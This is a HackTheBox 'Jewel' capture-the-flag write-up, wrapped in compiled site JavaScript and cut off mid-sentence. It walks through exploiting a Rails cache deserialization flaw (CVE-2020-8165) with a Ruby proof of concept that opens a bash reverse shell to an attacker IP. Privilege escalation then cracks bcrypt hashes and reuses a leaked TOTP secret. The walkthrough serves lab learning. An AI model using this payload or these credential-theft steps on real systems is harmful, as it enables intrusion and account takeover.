"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[6798],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>h});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var o=a.createContext({}),p=function(e){var t=a.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=p(e.components);return a.createElement(o.Provider,{value:t},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,l=e.originalType,o=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),c=p(n),m=r,h=c["".concat(o,".").concat(m)]||c[m]||d[m]||l;return n?a.createElement(h,i(i({ref:t},u),{},{components:n})):a.createElement(h,i({ref:t},u))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var l=n.length,i=new Array(l);i[0]=m;var s={};for(var o in t)hasOwnProperty.call(t,o)&&(s[o]=t[o]);s.originalType=e,s[c]="string"==typeof e?e:r,i[1]=s;for(var p=2;p<l;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},96642:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>i,default:()=>d,frontMatter:()=>l,metadata:()=>s,toc:()=>p});var a=n(87462),r=(n(67294),n(3905));const l={layout:"post",title:"Jewel ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","ruby","rails","gem","totp","otp","code","cve"],date:"2021/02/22 19:49:00",thumbnail:"/img/HackTheBox/jewel.png",toc:!0},i="Information",s={unversionedId:"HackTheBox/Jewel/write-up",id:"HackTheBox/Jewel/write-up",title:"Jewel ",description:"- Name: Jewel",source:"@site/writeups/HackTheBox/Jewel/write-up.md",sourceDirName:"HackTheBox/Jewel",slug:"/HackTheBox/Jewel/write-up",permalink:"/writeups/HackTheBox/Jewel/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"ruby",permalink:"/writeups/tags/ruby"},{label:"rails",permalink:"/writeups/tags/rails"},{label:"gem",permalink:"/writeups/tags/gem"},{label:"totp",permalink:"/writeups/tags/totp"},{label:"otp",permalink:"/writeups/tags/otp"},{label:"code",permalink:"/writeups/tags/code"},{label:"cve",permalink:"/writeups/tags/cve"}],version:"current",frontMatter:{layout:"post",title:"Jewel ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","ruby","rails","gem","totp","otp","code","cve"],date:"2021/02/22 19:49:00",thumbnail:"/img/HackTheBox/jewel.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"ForwardSlash ",permalink:"/writeups/HackTheBox/ForwardSlash/write-up"},next:{title:"Laboratory ",permalink:"/writeups/HackTheBox/Laboratory/write-up"}},o={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"Web discovery",id:"web-discovery",level:2},{value:"Source code analysis",id:"source-code-analysis",level:2},{value:"Web exploitation",id:"web-exploitation",level:2},{value:"Privilege Escalation of Machine : from bill to root",id:"privilege-escalation-of-machine--from-bill-to-root",level:2}],u={toc:p},c="wrapper";function d(e){let{components:t,...l}=e;return(0,r.kt)(c,(0,a.Z)({},u,l,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Jewel"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/282"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Jewel",src:n(9029).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap oath-toolkit rlwrap pwncat gtfoblookup\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Port and service scan with nmap:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"# Nmap 7.91 scan initiated Wed Feb 17 19:56:48 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.211\nNmap scan report for 10.10.10.211\nHost is up (0.030s latency).\nNot shown: 65532 filtered ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)\n|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)\n|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)\n8000/tcp open  http    Apache httpd 2.4.38\n|_http-generator: gitweb/2.20.1 git/2.20.1\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\n|_http-server-header: Apache/2.4.38 (Debian)\n| http-title: 10.10.10.211 Git\n|_Requested resource was http://10.10.10.211:8000/gitweb/\n8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)\n|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6\n|_http-title: BL0G!\nService Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Wed Feb 17 19:58:46 2021 -- 1 IP address (1 host up) scanned in 118.32 seconds\n")),(0,r.kt)("p",null,"We have gitweb/2.20.1 on port 8000 and Phusion Passenger 6.0.6 on port 8080."),(0,r.kt)("h2",{id:"web-discovery"},"Web discovery"),(0,r.kt)("p",null,"On gitweb we can browse to the summary of the only repository which is\nhosting the source code of the blog and download a snapshot of it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ curl --output blog.tar.gz -J -L 'http://10.10.10.211:8000/gitweb/?p=.git;a=snapshot;h=5d6f436256c9575fbc7b1fb9621b18f0f8656741;sf=tgz'\n$ tar xaf blog.tar.gz\n$ cd .git-5d6f436\n")),(0,r.kt)("h2",{id:"source-code-analysis"},"Source code analysis"),(0,r.kt)("p",null,"Let's install a ruby and bundle version matching the one specified in the Gemfile:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ asdf install ruby 2.5.5\n$ asdf local ruby 2.5.5\n$ gem install bundler:1.17.3\n")),(0,r.kt)("p",null,"It's not mandatory to analyse the source code but it will allow use to run the\nwebsite is we want to do some test or even the run ",(0,r.kt)("inlineCode",{parentName:"p"},"bundle outdated")," to check\nfor outdated dependencies."),(0,r.kt)("p",null,"Before we do that, we can see in ",(0,r.kt)("inlineCode",{parentName:"p"},"config.ru")," that the blog is a RoR app\n(using Ruby on Rails web framework)."),(0,r.kt)("p",null,"Let's see if the project is up to date:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},'$ bundle outdated\n...\nOutdated gems included in the bundle:\n  * actioncable (newest 6.1.3, installed 5.2.2.1)\n  * actionmailer (newest 6.1.3, installed 5.2.2.1)\n  * actionpack (newest 6.1.3, installed 5.2.2.1)\n  * actionview (newest 6.1.3, installed 5.2.2.1)\n  * activejob (newest 6.1.3, installed 5.2.2.1)\n  * activemodel (newest 6.1.3, installed 5.2.2.1)\n  * activerecord (newest 6.1.3, installed 5.2.2.1)\n  * activestorage (newest 6.1.3, installed 5.2.2.1)\n  * activesupport (newest 6.1.3, installed 5.2.2.1)\n  * autoprefixer-rails (newest 10.2.4.0, installed 9.8.6.3)\n  * bcrypt (newest 3.1.16, installed 3.1.15, requested ~> 3.1.7) in groups "default"\n  * bootsnap (newest 1.7.2, installed 1.4.8) in groups "default"\n  * bootstrap (newest 4.6.0, installed 4.5.2, requested ~> 4.5.0) in groups "default"\n  * capybara (newest 3.35.3, installed 3.33.0) in groups "test"\n  * childprocess (newest 4.0.0, installed 3.0.0)\n  * coffee-rails (newest 5.0.0, installed 4.2.2, requested ~> 4.2) in groups "default"\n  * concurrent-ruby (newest 1.1.8, installed 1.1.7)\n  * erubi (newest 1.10.0, installed 1.9.0)\n  * ffi (newest 1.14.2, installed 1.13.1)\n  * i18n (newest 1.8.9, installed 1.8.5)\n  * jbuilder (newest 2.11.2, installed 2.10.0, requested ~> 2.5) in groups "default"\n  * jquery-rails (newest 4.4.0, installed 4.3.3, requested = 4.3.3) in groups "default"\n  * listen (newest 3.4.1, installed 3.1.5, requested < 3.2, >= 3.0.5) in groups "development"\n  * loofah (newest 2.9.0, installed 2.6.0)\n  * mini_portile2 (newest 2.5.0, installed 2.4.0)\n  * minitest (newest 5.14.3, installed 5.14.1)\n  * msgpack (newest 1.4.2, installed 1.3.3)\n  * nio4r (newest 2.5.5, installed 2.5.2)\n  * nokogiri (newest 1.11.1, installed 1.10.10)\n  * popper_js (newest 2.6.0, installed 1.16.0, requested = 1.16.0) in groups "default"\n  * public_suffix (newest 4.0.6, installed 4.0.5)\n  * puma (newest 5.2.1, installed 3.12.6, requested ~> 3.11) in groups "default"\n  * rails (newest 6.1.3, installed 5.2.2.1, requested = 5.2.2.1) in groups "default"\n  * railties (newest 6.1.3, installed 5.2.2.1)\n  * rake (newest 13.0.3, installed 13.0.1)\n  * redis (newest 4.2.5, installed 4.2.1, requested ~> 4.0) in groups "default"\n  * regexp_parser (newest 2.0.3, installed 1.7.1)\n  * sass-rails (newest 6.0.0, installed 5.1.0, requested ~> 5.0) in groups "default"\n  * sprockets (newest 4.0.2, installed 3.7.2)\n  * sprockets-rails (newest 3.2.2, installed 3.2.1)\n  * thor (newest 1.1.0, installed 1.0.1)\n  * tzinfo (newest 2.0.4, installed 1.2.7)\n  * web-console (newest 4.1.0, installed 3.7.0) in groups "development"\n')),(0,r.kt)("p",null,"Seems that all dependencies are very outdated. We can install ",(0,r.kt)("inlineCode",{parentName:"p"},"bundler-audit"),",\nwhich is an equivalent for Ruby to ",(0,r.kt)("inlineCode",{parentName:"p"},"npm audit")," in Nodejs, to check for CVE\nimpacting the dependencies."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ gem install bundler-audit\n$ bundle-audit\nName: actionpack\nVersion: 5.2.2.1\nAdvisory: CVE-2020-8166\nCriticality: Unknown\nURL: https://groups.google.com/forum/#!topic/rubyonrails-security/NOjKiGeXUgw\nTitle: Ability to forge per-form CSRF tokens given a global CSRF token\nSolution: upgrade to ~> 5.2.4.3, >= 6.0.3.1\n\nName: actionpack\nVersion: 5.2.2.1\nAdvisory: CVE-2020-8164\nCriticality: Unknown\nURL: https://groups.google.com/forum/#!topic/rubyonrails-security/f6ioe4sdpbY\nTitle: Possible Strong Parameters Bypass in ActionPack\nSolution: upgrade to ~> 5.2.4.3, >= 6.0.3.1\n\nName: actionview\nVersion: 5.2.2.1\nAdvisory: CVE-2020-5267\nCriticality: Unknown\nURL: https://groups.google.com/forum/#!topic/rubyonrails-security/55reWMM_Pg8\nTitle: Possible XSS vulnerability in ActionView\nSolution: upgrade to >= 5.2.4.2, ~> 5.2.4, >= 6.0.2.2\n\nName: actionview\nVersion: 5.2.2.1\nAdvisory: CVE-2020-8167\nCriticality: Unknown\nURL: https://groups.google.com/forum/#!topic/rubyonrails-security/x9DixQDG9a0\nTitle: CSRF Vulnerability in rails-ujs\nSolution: upgrade to ~> 5.2.4.3, >= 6.0.3.1\n\nName: activestorage\nVersion: 5.2.2.1\nAdvisory: CVE-2020-8162\nCriticality: Unknown\nURL: https://groups.google.com/forum/#!topic/rubyonrails-security/PjU3946mreQ\nTitle: Circumvention of file size limits in ActiveStorage\nSolution: upgrade to ~> 5.2.4.3, >= 6.0.3.1\n\nName: activesupport\nVersion: 5.2.2.1\nAdvisory: CVE-2020-8165\nCriticality: Unknown\nURL: https://groups.google.com/forum/#!topic/rubyonrails-security/bv6fW4S0Y1c\nTitle: Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore\nSolution: upgrade to ~> 5.2.4.3, >= 6.0.3.1\n\nName: jquery-rails\nVersion: 4.3.3\nAdvisory: CVE-2019-11358\nCriticality: Medium\nURL: https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/\nTitle: Prototype pollution attack through jQuery $.extend\nSolution: upgrade to >= 4.3.4\n\nVulnerabilities found!\n")),(0,r.kt)("p",null,"The one one activesupport seems to be the most promising because unmarshalling\nis a kind of deserialization that can lead to RCE:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"Name: activesupport\nVersion: 5.2.2.1\nAdvisory: CVE-2020-8165\nCriticality: Unknown\nURL: https://groups.google.com/forum/#!topic/rubyonrails-security/bv6fW4S0Y1c\nTitle: Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore\nSolution: upgrade to ~> 5.2.4.3, >= 6.0.3.1\n")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE."),(0,r.kt)("p",{parentName:"blockquote"},"Ref. ",(0,r.kt)("a",{parentName:"p",href:"https://nvd.nist.gov/vuln/detail/CVE-2020-8165"},"CVE-2020-8165"))),(0,r.kt)("p",null,"We sure have a vulnerable version of Rails:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ grep \"'rails'\" Gemfile\n# Bundle edge Rails instead: gem 'rails', github: 'rails/rails'\ngem 'rails', '= 5.2.2.1'\n")),(0,r.kt)("p",null,"The References section of CVE-2020-8165 page on NVD gives a link to a\n",(0,r.kt)("a",{parentName:"p",href:"https://hackerone.com/reports/413388"},"HackerOne report")," tagged as ",(0,r.kt)("em",{parentName:"p"},"exploit"),"\nin addition to the many ",(0,r.kt)("em",{parentName:"p"},"mailing list"),"."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/eMHoziB.png",alt:null})),(0,r.kt)("p",null,"By reading the H1 report, we can read:"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"This vulnerability effects application code that caches a string from an untrusted source using the ",(0,r.kt)("inlineCode",{parentName:"p"},"raw: true")," option.")),(0,r.kt)("p",null,"So let's find if the option is used in the code:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},'$ grep -rn \'raw: true\' app\napp/controllers/application_controller.rb:32:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) do\napp/controllers/users_controller.rb:37:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"app/controllers/users_controller.rb")," L32-L49"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},'  def update\n    @user = User.find(params[:id])\n    if @user && @user == current_user\n      cache = ActiveSupport::Cache::RedisCacheStore.new(url: "redis://127.0.0.1:6379/0")\n      cache.delete("username_#{session[:user_id]}")\n      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}\n      if @user.update(user_params)\n        flash[:success] = "Your account was updated successfully"\n        redirect_to articles_path\n      else\n        cache.delete("username_#{session[:user_id]}")\n        render \'edit\'\n      end\n    else\n      flash[:danger] = "Not authorized"\n      redirect_to articles_path\n    end\n  end\n')),(0,r.kt)("p",null,"The ",(0,r.kt)("inlineCode",{parentName:"p"},"update")," method will cache a key ",(0,r.kt)("inlineCode",{parentName:"p"},"username_<user_id>")," using ",(0,r.kt)("inlineCode",{parentName:"p"},"user_params[:username]"),"\nwhich is user supplied and so untrusted.\nIt will cache the value and then try to update the database but if it fails it will\nremove the cached value."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"app/controllers/application_controller.rb")," L29-L40"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},'  def current_username\n    if session[:user_id]\n      cache = ActiveSupport::Cache::RedisCacheStore.new(url: "redis://127.0.0.1:6379/0")\n      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) do\n        @current_user = current_user\n        @current_username = @current_user.username\n      end\n    else\n      @current_username = "guest"\n    end\n    return @current_username\n  end\n')),(0,r.kt)("p",null,"The key is also fetched with ",(0,r.kt)("inlineCode",{parentName:"p"},"current_username")," method."),(0,r.kt)("p",null,"Let's see what is the format of an username to know if we can poison it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},'$ grep -rn \':username\' app\napp/views/users/_form.html.erb:7:    <%= f.label :username %>\napp/views/users/_form.html.erb:8:    <%= f.text_field :username, class: "form-control", placeholder: "Username", autofocus: true %>\napp/views/users/edit.html.erb:10:    <%= f.label :username %>\napp/views/users/edit.html.erb:11:    <%= f.text_field :username, class: "form-control", placeholder: "Username", autofocus: true %>\napp/controllers/users_controller.rb:37:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}\napp/controllers/users_controller.rb:53:    params.require(:user).permit(:username, :email, :password)\napp/models/user.rb:6: validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 },\n')),(0,r.kt)("p",null,"The user class must be defined in ",(0,r.kt)("inlineCode",{parentName:"p"},"app/models/user.rb"),"."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"app/models/user.rb")," L1-L11"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},"class User < ActiveRecord::Base\n has_many :articles\n has_secure_password\n VALID_USER_REGEX = /\\A[\\w\\d]+\\z/\n VALID_EMAIL_REGEX = /\\A[\\w+\\-.]+@[a-z\\d\\-.]+\\.[a-z]+\\z/i\n validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 },\n                      format: { with: VALID_USER_REGEX }\n validates :email, presence: true, length: { maximum: 105 }, uniqueness: { case_sensitive: false },\n                   format: { with: VALID_EMAIL_REGEX }\n before_save { self.email = email.downcase }\nend\n")),(0,r.kt)("p",null,"So the username must contains only alphanumeric characters and be 3 to 25 chars\nlong.\nAt first glance it looks impossible to poison the username with a malicious\npayload to corrupt the cache.\nBut a more in depth analysis shows that we will be able to perform our\ndeserialization to RCE."),(0,r.kt)("p",null,"Looking back at ",(0,r.kt)("inlineCode",{parentName:"p"},"app/controllers/users_controller.rb")," the username is\nwritten into the cache without any control (what we just saw in ",(0,r.kt)("inlineCode",{parentName:"p"},"app/models/user.rb"),"\nare constraints on the database not the cache), then it will update the database\nbut fails because there username format won't we respected and so it will trigger\nthe cache deletion. But the deletion won't work because as the payload will be\nevaluated it will crash the app (500 error) so the cached value will stay stored\nand be retrieved on a subsequent fetch request."),(0,r.kt)("h2",{id:"web-exploitation"},"Web exploitation"),(0,r.kt)("p",null,"Since it's an authenticated vulnerability (yes to update your username you need\nan account), let's register one on the blog (",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.211:8080/signup"},"http://10.10.10.211:8080/signup"),")."),(0,r.kt)("p",null,"We can edit the username at this address ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.211:8080/users/19/edit"},"http://10.10.10.211:8080/users/19/edit"),"\nbut before that we'll need to craft a payload."),(0,r.kt)("p",null,"Let's retrieve the PoC from the H1 report and modify it a little bit to include\na reverse shell and url-encode the payload:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},"require 'erb'\nrequire 'rails/all'\nrequire 'uri'\n\nremote_code = <<-RUBY\n`/bin/bash -c \"bash -i &>/dev/tcp/10.10.14.125/9999 0>&1\"`\nRUBY\n\nerb = ERB.allocate\nerb.instance_variable_set(:@src, remote_code)\nerb.instance_variable_set(:@lineno, 0)\ndeprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)\nexploit_data = Marshal.dump(deprecation)\n\nputs URI.encode_www_form(username: exploit_data)\n")),(0,r.kt)("p",null,"Lets' build the payload:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ bundle exec ruby exploit.rb\nusername=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22B%25x%28%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.125%2F9999+0%3E%261%22%29%0A%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T\n")),(0,r.kt)("p",null,"Intercept traffic with Burp and replace the username with the payload."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-http"},"POST /users/19 HTTP/1.1\nHost: 10.10.10.211:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://10.10.10.211:8080/users/19/edit\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 584\nOrigin: http://10.10.10.211:8080\nConnection: close\nCookie: _session_id=39429a031ee66edae6af06579185eb80\nUpgrade-Insecure-Requests: 1\n\nutf8=%E2%9C%93&_method=patch&authenticity_token=tlufjzm%2FbY9fBxS%2Bu1QqkY%2BoaSXn3cEL40I1tGF6g4lYvmhcsv8i5NKjpDuOnn6vOABZIzmfLrWS%2Fy7vjgEAsQ%3D%3D&user%5Busername%5D=username=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22B%25x%28%2Fbin%2Fbash+-c+%22bash+-i+%26%3E%2Fdev%2Ftcp%2F10.10.14.125%2F9999+0%3E%261%22%29%0A%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T&commit=Update+User\n")),(0,r.kt)("p",null,"We retrieve the shell on our listener:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ rlwrap pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.10.211:51176 (family 2/IPv4, TCP)\nbash: cannot set terminal process group (811): Inappropriate ioctl for device\nbash: no job control in this shell\nbill@jewel:~/blog$ id\nuid=1000(bill) gid=1000(bill) groups=1000(bill)\n\nbill@jewel:~$ cat user.txt\n02d71a6b8858cc2812ee368bc1ab355b\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-bill-to-root"},"Privilege Escalation of Machine : from bill to root"),(0,r.kt)("p",null,"Let's get an interactive shell:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"bill@jewel:~$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n")),(0,r.kt)("p",null,"We can't use ",(0,r.kt)("inlineCode",{parentName:"p"},"sudo -l")," because we don't know bill's password."),(0,r.kt)("p",null,"Let's find backup or config files in hope to discover passwords:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"bill@jewel:~$ find / -name *.sql -type f 2>/dev/null\n/var/backups/dump_2020-08-27.sql\n/usr/share/postgresql/11/extension/citext--1.4--1.5.sql\n...\n\nbill@jewel:~$ grep -n password /var/backups/dump_2020-08-27.sql\n132:    password_digest character varying\n229:COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;\n")),(0,r.kt)("p",null,"Let's dig around line 229:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"--\n-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: rails_dev\n--\n\nCOPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;\n2       jennifer        jennifer@mail.htb       2020-08-27 05:44:28.551735      2020-08-27 05:44:28.551735      $2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO\n1       bill    bill@mail.htb   2020-08-26 10:24:03.878232      2020-08-27 09:18:11.636483      $2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW\n\\.\n")),(0,r.kt)("p",null,"Let's ask my old pall John if he knows them:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"jennifer:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO\nbill:$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ john hashes.txt --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=bcrypt\n")),(0,r.kt)("p",null,"I found bill's password but not jennifer one."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"bill")," / ",(0,r.kt)("inlineCode",{parentName:"p"},"spongebob")),(0,r.kt)("p",null,"Trying sudo again we are asked for a verification code, it reminds me when\nI set up OTP with ",(0,r.kt)("a",{parentName:"p",href:"https://wiki.archlinux.org/index.php/Google_Authenticator"},(0,r.kt)("inlineCode",{parentName:"a"},"libpam-google-authenticator"))," for a SSH server."),(0,r.kt)("p",null,"We can find bill's OTP private key in his home directory:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},'bill@jewel:~$ cat .google_authenticator\n2UQI3R52WFCLE6JTLDCSJYMJH4\n" WINDOW_SIZE 17\n" TOTP_AUTH\n')),(0,r.kt)("p",null,"I was able to generate a one time password with oath-toolkit:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ oathtool -b --totp 2UQI3R52WFCLE6JTLDCSJYMJH4\n297774\n")),(0,r.kt)("p",null,"But I kept having this error while trying to auth:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},'Error "Operation not permitted" while writing config\n')),(0,r.kt)("p",null,"TOTP is time based and I'm not in the same timezone than the box:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"# box\nSun 21 Feb 20:45:21 GMT 2021\n# my machine\nSun Feb 21 09:35:41 PM CET 2021\n")),(0,r.kt)("p",null,"Let's print the box time in RFC format:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ date --rfc-3339=seconds\n2021-02-21 20:50:55+00:00\n")),(0,r.kt)("p",null,"So I tried to create the OTP code like that but it kept failing:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ oathtool -b --totp 2UQI3R52WFCLE6JTLDCSJYMJH4 -S '2021-02-21 20:54:31+00:00'\n626503\n")),(0,r.kt)("p",null,"Let's try another method: setting teh same time on our machine. The box 